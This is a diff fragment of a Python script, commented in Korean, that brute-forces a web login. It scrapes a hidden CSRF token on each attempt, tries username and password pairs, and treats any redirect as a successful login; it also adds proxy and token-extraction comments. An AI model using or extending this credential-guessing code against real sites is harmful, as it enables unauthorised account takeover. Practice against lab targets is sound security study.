@@ -41,6 +41,10 @@ def load_wordlist(path):
 def brute_force(url, users, passwords, proxy):
     session = requests.Session()
     session.headers.update({"User-Agent": USER_AGENT})
+    # proxies = {
+    #     "http": "http://10.10.1.10:1080",
+    #     "https": "http://10.10.1.10:1080",
+    # }
     proxies = {"http": proxy, "https": proxy} if proxy else {}
     total = len(users) * (len(passwords) + 1)  # +1 -> 빈 비밀번호 포함
 
@@ -59,6 +63,8 @@ def brute_force(url, users, passwords, proxy):
                 request_get = session.get(
                     url=url, proxies=proxies, timeout=REQUEST_TIMEOUT_SEC
                 )
+
+                # <input type="hidden" name="token" value="d41d8cd98f00b204e9800998ecf8427e" /> -> 여기서 추출
                 # 이 부분은 해당 사이트마다 달라짐
                 token = (
                     request_get.text.split('name="token"')[1]
@@ -85,13 +91,12 @@ def brute_force(url, users, passwords, proxy):
                 # 빈 비밀번호 처리
                 display_pw = "(빈 비밀번호)" if pw == "" else pw
 
-                if request_post.status_code in (301, 302, 303, 307):
+                if request_post.status_code in range(300, 400):
                     print(f"[+] 성공! user: {user}, password: {display_pw}")
                     return True
 
                 print(
-                    f"[-] {count}/{total} -> failed user: {user}, password: {display_pw}",
-                    end="\r",
+                    f"[-] {count}/{total} -> failed user: {user}, password: {display_pw}"
                 )
 
             except (
